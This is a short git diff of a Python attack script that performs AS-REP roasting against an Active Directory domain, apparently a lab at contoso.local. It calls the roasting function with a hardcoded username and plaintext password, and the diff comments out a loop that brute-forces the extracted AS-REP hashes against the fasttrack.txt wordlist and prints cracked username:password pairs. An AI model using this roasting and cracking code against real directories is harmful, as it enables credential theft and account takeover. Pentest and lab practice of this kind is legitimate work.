@@ -55,10 +55,10 @@ def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=N
 #asrep_out = asreproast(dc_ip='192.168.56.133', domain='contoso.local', usersfile='SamAccountNames.txt') # Unauth
 asrep_out = asreproast(dc_ip='192.168.56.133', username='l.douglas', password='Football1', domain='contoso.local') # Auth
 
-print(asrep_out)
-
-if asrep_out is not None:
-    for asrep in asrep_out:
-        result = bruteforce('fasttrack.txt', asrep['asrep'], 'asrep')
-        if result is not None:
-            print(f"{asrep['username']}:{result}")
+#print(asrep_out)
+#
+#if asrep_out is not None:
+#    for asrep in asrep_out:
+#        result = bruteforce('fasttrack.txt', asrep['asrep'], 'asrep')
+#        if result is not None:
+#            print(f"{asrep['username']}:{result}")
